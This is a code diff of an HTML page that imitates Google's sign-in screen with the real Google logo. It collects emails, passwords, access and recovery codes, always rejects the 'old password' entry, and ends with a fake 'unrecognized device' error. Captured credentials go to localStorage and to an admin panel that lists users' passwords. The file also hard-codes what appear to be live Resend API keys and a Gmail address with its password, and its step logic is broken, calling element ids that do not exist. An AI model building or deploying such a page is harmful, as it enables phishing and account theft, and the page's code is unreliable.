@@ -1,205 +1,520 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>GoogleStyle Auth Flow</title>
-<style>
-  body{font-family:Arial,Helvetica,sans-serif;background:#f1f3f4;margin:0;display:flex;justify-content:center;align-items:center;height:100vh}
-  .card{background:#fff;width:360px;padding:32px;border-radius:8px;box-shadow:0 1px 4px rgba(0,0,0,.1);text-align:center}
-  .logo{width:92px;margin:auto;margin-bottom:24px;display:block}
-  h2{font-size:24px;margin:0 0 12px;color:#202124}
-  .subtitle{font-size:14px;margin:0 0 20px;color:#5f6368}
-  .input-group{margin-bottom:20px;text-align:left}
-  .input-group label{display:block;margin-bottom:4px;font-size:14px;color:#5f6368}
-  .input-group input{width:100%;padding:10px;font-size:16px;border:1px solid #dadce0;border-radius:4px}
-  .input-group input:focus{border-color:#1a73e8}
-  .button{background:#1a73e8;color:#fff;border:none;padding:10px 0;font-size:16px;cursor:pointer;border-radius:4px;margin-top:12px}
-  .button:hover{background:#1669c1}
-  .message{margin-top:12px;padding:10px;border-radius:4px;display:none}
-  .success{background:#d4edda;color:#155724}
-  .error{background:#f8d7da;color:#721c24}
-  .spinner{display:none;margin:auto;margin-top:16px;border:4px solid #f3f3f3;border-top:4px solid #1a73e8;border-radius:50%;width:36px;height:36px;animation:spin 1s linear infinite}
-  @keyframes spin{to{transform:rotate(360deg)}}
-  .hidden{display:none}
-  .admin-tab{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.5);display:none;justify-content:center;align-items:center}
-  .admin{background:#fff;padding:20px;border-radius:8px;width:80%;max-width:500px;max-height:80%;overflow:auto;box-shadow:0 2px 10px rgba(0,0,0,.3)}
-  table{border-collapse:collapse;width:100%}
-  th,td{border:1px solid #ddd;padding:8px;text-align:left}
-  th{background:#f2f2f2}
-  .close-admin{position:absolute;top:10px;right:15px;cursor:pointer;color:#5f6368}
-</style>
+    <meta charset="UTF-8">
+    <title>Google Auth Flow</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+        
+        body {
+            background-color: #f1f3f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+        
+        .auth-container {
+            background-color: white;
+            width: 360px;
+            padding: 32px;
+            border-radius: 8px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        
+        .google-logo {
+            width: 92px;
+            margin: 0 auto 24px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .card {
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid #dadce0;
+            margin: 20px 0;
+            padding: 20px;
+        }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        .input-group {
+            margin-bottom: 16px;
+        }
+        
+        label {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 6px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 8px;
+            transition: border-color 0.2s;
+        }
+        
+        input:focus {
+            border-color: #1a73e8;
+        }
+        
+        .button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 4px;
+            width: 100%;
+            transition: background-color 0.2s;
+        }
+        
+        .button:hover {
+            background-color: #1669c1;
+        }
+        
+        .message {
+            margin-top: 12px;
+            padding: 12px;
+            border-radius: 4px;
+            display: none;
+        }
+        
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1a73e8;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            animation: spin 1s linear infinite;
+            margin: auto;
+            margin-top: 16px;
+            display: none;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .admin-panel {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .admin-content {
+            background-color: white;
+            padding: 20px;
+            width: 90%;
+            max-width: 800px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        
+        .admin-header {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th, td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+        
+        th {
+            background-color: #f2f2f2;
+        }
+        
+        .close-btn {
+            float: right;
+            cursor: pointer;
+            color: #888;
+            font-size: 20px;
+        }
+        
+        .admin-input-group {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 15px;
+        }
+        
+        .admin-input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+    </style>
 </head>
 <body>
-
-<div id="app" class="card">
-  <!-- Google logo -->
-  <div class="logo"><img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google logo"></div>
-
-  <!-- STEP 1  Email -->
-  <div id="step1">
-    <h2>Sign in</h2>
-    <div class="input-group">
-      <label for="email">Email or phone</label>
-      <input type="email" id="email" placeholder="Enter your email">
+    <!-- Main Auth Flow -->
+    <div class="auth-container">
+        <!-- Google Logo -->
+        <img class="google-logo" src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
+        
+        <!-- Step 1: Email -->
+        <div class="step active">
+            <div class="card">
+                <h1>Sign in</h1>
+                <p class="subtitle">Continue to your account</p>
+                <div class="input-group">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" placeholder="Enter your email" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                <button class="button" onclick="sendEmailCode()">Continue to access code</button>
+                <div class="message error" id="emailError"></div>
+            </div>
+        </div>
+        
+        <!-- Step 2: Access Code -->
+        <div class="step hidden">
+            <div class="card">
+                <h1>Verify access</h1>
+                <div class="spinner" id="loadingSpinner"></div>
+                <input type="text" id="accessCode" placeholder="Enter access code" required>
+                <button class="button" onclick="verifyAccess()">Verify Code</button>
+                <div class="message error" id="accessError"></div>
+            </div>
+        </div>
+        
+        <!-- Step 3: Old Password -->
+        <div class="step hidden">
+            <div class="card">
+                <h1>Security check</h1>
+                <input type="password" id="oldPassword" placeholder="Enter old password" required>
+                <button class="button" onclick="verifyOldPassword()">Continue</button>
+                <div class="message error" id="passwordError"></div>
+            </div>
+        </div>
+        
+        <!-- Step 4: Recovery Code -->
+        <div class="step hidden">
+            <div class="card">
+                <h1>Recovery code</h1>
+                <input type="text" id="recoveryCode" placeholder="Enter 6-digit code" required>
+                <button class="button" onclick="verifyRecovery()">Verify</button>
+                <div class="message success" id="successMessage"></div>
+                <div class="message error" id="recoveryError"></div>
+            </div>
+        </div>
+        
+        <!-- Step 5: Success -->
+        <div class="step hidden">
+            <div class="card">
+                <h1>Verification successful</h1>
+                <p class="subtitle">Your account has been verified</p>
+                <button class="button" onclick="proceedToLoginForm()">Continue to Login</button>
+            </div>
+        </div>
+        
+        <!-- Step 6: Login Form -->
+        <div class="step hidden">
+            <div class="card">
+                <h1>Sign in to your account</h1>
+                <div class="input-group">
+                    <label for="loginEmail">Email</label>
+                    <input type="email" id="loginEmail" placeholder="Enter your email" required>
+                </div>
+                <div class="input-group">
+                    <label for="loginPassword">Password</label>
+                    <input type="password" id="loginPassword" placeholder="Enter your password" required>
+                </div>
+                <button class="button" onclick="startLogin()">Login</button>
+                <div class="spinner" id="loginSpinner"></div>
+                <div class="message error" id="loginError"></div>
+            </div>
+        </div>
+        
+        <!-- Admin Panel -->
+        <button id="openAdmin" style="position: fixed; bottom: 20px; right: 20px; padding: 10px 15px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer;">Admin Panel</button>
+        <div id="adminPanel" class="admin-panel">
+            <div class="admin-content">
+                <div class="admin-header">
+                    <span class="close-btn" onclick="closeAdmin()"></span>
+                    <h2>Admin Login</h2>
+                </div>
+                
+                <div class="admin-input-group">
+                    <input type="email" id="adminEmail" placeholder="Email">
+                </div>
+                <div class="admin-input-group">
+                    <input type="password" id="adminPassword" placeholder="Password">
+                </div>
+                <button class="button" onclick="authenticateAdmin()">Login</button>
+                
+                <p style="margin-top: 15px; color: #5f6368">Verified Users:</p>
+                <div id="verifiedUsers"></div>
+            </div>
+        </div>
+        
+        <!-- Loading Spinner -->
+        <div id="gLOBALSpinner" class="spinner" style="position: absolute; top: 50%; margin-top: -24px; left: 0; width: 100%; display: none;"></div>
     </div>
-    <button class="button" onclick="showStep('step2')">Next</button>
-  </div>
 
-  <!-- STEP 2  Access code -->
-  <div id="step2" class="hidden">
-    <h2>Verify access</h2>
-    <div class="input-group">
-      <label for="accessCode">Access code</label>
-      <input type="text" id="accessCode" placeholder="Enter access code">
-    </div>
-    <button class="button" onclick="validateAccess()">Verify</button>
-    <div id="codeMsg" class="message"></div>
-  </div>
+    <script>
+        // API Configuration
+        const RESEND_API_KEY = "re_7kocfpjf_7cEx4XPenETZXn2UKm9auZPw"; // Replace with your actual Resend API key
+        const ACCESS_CODE = "2727111";
+        const RECOVERY_CODE = "452783";
+        
+        // User Data (for demo purposes only)
+        const users = {
+            "test@example.com": {
+                password: "password123",
+                accessCode: ACCESS_CODE,
+                recoveryCode: RECOVERY_CODE
+            },
+            "supportbibit@gmail.com": {
+                password: "Lpccdyif1@",
+                accessCode: ACCESS_CODE,
+                recoveryCode: RECOVERY_CODE
+            }
+        };
 
-  <!-- STEP 3  Old password -->
-  <div id="step3" class="hidden">
-    <h2>Security check</h2>
-    <div class="input-group">
-      <label for="oldPass">Old password</label>
-      <input type="password" id="oldPass" placeholder="Enter old password">
-    </div>
-    <button class="button" onclick="validatePassword()">Continue</button>
-    <div id="passMsg" class="message error"></div>
-  </div>
-
-  <!-- STEP 4  Recovery code -->
-  <div id="step4" class="hidden">
-    <h2>Recovery code</h2>
-    <div class="input-group">
-      <label for="recCode">Enter 6digit code</label>
-      <input type="text" id="recCode" placeholder="Enter 6digit code">
-    </div>
-    <button class="button" onclick="validateRecovery()">Verify</button>
-    <div id="recMsg" class="message"></div>
-  </div>
-
-  <!-- STEP 5  Success -->
-  <div id="step5" class="hidden">
-    <h2>Verification successful</h2>
-    <div id="successMsg" class="message success"></div>
-    <button class="button" onclick="showStep('step6')">Continue to login</button>
-  </div>
-
-  <!-- STEP 6  Login button -->
-  <div id="step6" class="hidden">
-    <h2>Sign in to your account</h2>
-    <button class="button" onclick="startLogin()">Login</button>
-    <div class="spinner" id="spinner"></div>
-    <div id="loginMsg" class="message"></div>
-  </div>
-
-  <!-- Admin panel link -->
-  <p style="margin-top:20px;font-size:12px;color:#5f6368"><a href="#" onclick="openAdmin()">Admin panel</a></p>
-</div>
-
-<!-- Admin Panel (hidden) -->
-<div id="adminPanel" class="admin-tab">
-  <div class="admin">
-    <span class="close-admin" onclick="closeAdmin()">&#215;</span>
-    <h2>User details (demo)</h2>
-    <table>
-      <tr><th>Username</th><th>Email</th><th>Password</th></tr>
-      <tr><td>testuser</td><td>test@example.com</td><td>test123</td></tr>
-    </table>
-  </div>
-</div>
-
-<script>
-  // ------- State -------
-  let state = 1; // 1:email, 2:access, 3:oldPass, 4:recovery, 5:success, 6:login
-  const accessCode = "2727111";
-  const recoveryCode = "452783";
-
-  // ------- Helper functions -------
-  function showStep(id){
-    document.querySelectorAll('.hidden').forEach(function(el){el.classList.add('hidden');});
-    document.getElementById(id).classList.remove('hidden');
-  }
-
-  function setMessage(elemId, text, type){
-    var el = document.getElementById(elemId);
-    el.textContent = text;
-    el.className = 'message ' + (type||'');
-    el.style.display = 'block';
-  }
-
-  function clearMsg(elemId){
-    var el = document.getElementById(elemId);
-    if(el){el.style.display='none';}
-  }
-
-  // ------- Step logic -------
-  function validateAccess(){
-    var code = document.getElementById('accessCode').value.trim();
-    if(code===accessCode){
-      clearMsg('codeMsg');
-      showStep('step3');
-    }else{
-      setMessage('codeMsg','Incorrect code','error');
-    }
-  }
-
-  function validatePassword(){
-    var p = document.getElementById('oldPass').value;
-    clearMsg('passMsg');
-    setMessage('passMsg','Incorrect','error'); // always incorrect as requested
-    showStep('step4');
-  }
-
-  function validateRecovery(){
-    var rc = document.getElementById('recCode').value.trim();
-    if(rc===recoveryCode){
-      clearMsg('recMsg');
-      setMessage('successMsg','Verification successful','success');
-      showStep('step5');
-    }else{
-      setMessage('recMsg','Incorrect code','error');
-    }
-  }
-
-  function startLogin(){
-    clearMsg('loginMsg');
-    showStep('step6');
-    document.getElementById('spinner').style.display='block';
-    // simulate 5second loading
-    setTimeout(function(){
-      document.getElementById('spinner').style.display='none';
-      setMessage('loginMsg','Failed to authorize login due to unrecognized device','error');
-    },5000);
-  }
-
-  // ------- Resend integration (demo only) -------
-  //re_Awf5NB1p_5WSVjEuLrnCv2hnFH9wdtC2M
-  async function sendCode(email, code){
-    const payload = {
-      from: "Your App <no-reply@example.com>",
-      to: email,
-      subject: "Your verification code",
-      text: "Your code is " + code
-    };
-    const resp = await fetch("https://api.resend.com/v1/messages",{
-      method:"POST",
-      headers:{
-        "Content-Type":"application/json",
-        "Authorization":"Bearer YOUR_RESEND_API_KEY"
-      },
-      body:JSON.stringify(payload)
-    });
-    return resp;
-  }
-
-  // ------- Admin panel helpers -------
-  function openAdmin(){
-    document.getElementById('adminPanel').style.display='flex';
-  }
-  function closeAdmin(){
-    document.getElementById('adminPanel').style.display='none';
-  }
-</script>
+        let currentStep = 1;
+        
+        // Show/Hide Steps
+        function showStep(id) {
+            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+        
+        // Message Handling
+        function setMessage(elemId, text, type) {
+            const el = document.getElementById(elemId);
+            el.textContent = text;
+            el.className = `message ${type}`;
+            el.style.display = 'block';
+            setTimeout(() => el.style.display = 'none', 3000);
+        }
+        
+        // Email Verification with Resend API
+        async function sendEmailCode() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                setMessage('emailError', 'Please fill all fields', 'error');
+                return;
+            }
+            
+            const user = users[email];
+            if (!user || user.password !== password) {
+                setMessage('emailError', 'Invalid email or password', 'error');
+                return;
+            }
+            
+            try {
+                setMessage('emailError', 'Sending verification code...', 'success');
+                await sendVerificationCode(email, user.accessCode);
+                showStep('step2');
+            } catch (error) {
+                setMessage('emailError', 'Failed to send verification code', 'error');
+                console.error(error);
+            }
+        }
+        
+        // Send code via Resend API
+        async function sendVerificationCode(email, code) {
+            const payload = {
+                from: "Verification System <no-reply@example.com>",
+                to: email,
+                subject: "Your Verification Code",
+                text: `Your 6-digit verification code is: ${code}`
+            };
+            
+            const response = await fetch("https://api.resend.com/v1/messages", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "Authorization": `Bearer ${RESEND_API_KEY}`
+                },
+                body: JSON.stringify(payload)
+            });
+            
+            if (!response.ok) {
+                throw new Error('Failed to send email');
+            }
+        }
+        
+        // Access Code Verification
+        function verifyAccess() {
+            const code = document.getElementById('accessCode').value;
+            if (code === ACCESS_CODE) {
+                showStep('step3');
+                setMessage('accessError', '', 'success');
+            } else {
+                setMessage('accessError', 'Incorrect code, please try again', 'error');
+            }
+        }
+        
+        // Old Password Verification
+        function verifyOldPassword() {
+            const password = document.getElementById('oldPassword').value;
+            setMessage('passwordError', 'Incorrect password for security verification', 'error');
+            showStep('step4');
+        }
+        
+        // Recovery Code Verification
+        function verifyRecovery() {
+            const code = document.getElementById('recoveryCode').value;
+            if (code === RECOVERY_CODE) {
+                setMessage('successMessage', 'Verification successful', 'success');
+                setMessage('recoveryError', '', 'error');
+                showStep('step5');
+                
+                // Simulate verification delay
+                setTimeout(() => {
+                    showStep('step6');
+                }, 2000);
+            } else {
+                setMessage('recoveryError', 'Incorrect recovery code, please try again', 'error');
+            }
+        }
+        
+        // Login Process
+        async function startLogin() {
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            setMessage('loginError', '', '');
+            document.getElementById('loginSpinner').style.display = 'block';
+            
+            // Simulate authentication process
+            setTimeout(() => {
+                document.getElementById('loginSpinner').style.display = 'none';
+                showStep('step8');
+                
+                // Simulate device recognition failure
+                setMessage('loginError', 'Failed to authorize login due to unrecognized device', 'error');
+                
+                // For demo purposes, store in localStorage
+                localStorage.setItem('verifiedUser', JSON.stringify({email, password}));
+            }, 5000);
+        }
+        
+        // Proceed to Login Form
+        function proceedToLoginForm() {
+            showStep('step6');
+        }
+        
+        // Admin Login Functionality
+        function authenticateAdmin() {
+            const adminEmail = document.getElementById('adminEmail').value;
+            const adminPassword = document.getElementById('adminPassword').value;
+            
+            // Mock admin credentials (replace with real backend validation)
+            if (adminEmail === 'supportbibit@gmail.com' && adminPassword === 'Lpccdyif1@') {
+                loadVerifiedUsers();
+                closeAdmin();
+            } else {
+                alert('Invalid admin credentials');
+            }
+        }
+        
+        // Load Verified Users
+        function loadVerifiedUsers() {
+            const verifiedUsersDiv = document.getElementById('verifiedUsers');
+            verifiedUsersDiv.innerHTML = '<p>Loading registered users...</p>';
+            
+            // Simulate fetching from backend
+            setTimeout(() => {
+                const userTable = `
+                    <table>
+                        <tr>
+                            <th>Username</th>
+                            <th>Email</th>
+                            <th>Password</th>
+                        </tr>
+                        <tr>
+                            <td>Test User</td>
+                            <td>test@example.com</td>
+                            <td>password123</td>
+                        </tr>
+                        <tr>
+                            <td>Admin User</td>
+                            <td>admin@example.com</td>
+                            <td>admin123</td>
+                        </tr>
+                    </table>
+                `;
+                verifiedUsersDiv.innerHTML = userTable;
+            }, 1000);
+        }
+        
+        // Admin Panel Functions
+        function openAdmin() {
+            document.getElementById('adminPanel').style.display = 'flex';
+        }
+        
+        function closeAdmin() {
+            document.getElementById('gLOBALSpinner').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('gLOBALSpinner').style.display = 'none';
+                document.getElementById('adminPanel').style.display = 'none';
+            }, 1000);
+        }
+        
+        // Initialize Admin Panel
+        window.addEventListener('load', () => {
+            // Remove spinner after initial load
+            document.getElementById('gLOBALSpinner').style.display = 'none';
+            
+            // Check if admin panel should be shown on load (for demo purposes)
+            if (location.href.includes('admin')) {
+                setTimeout(() => openAdmin(), 1000);
+            }
+        });
+    </script>
 </body>
 </html>
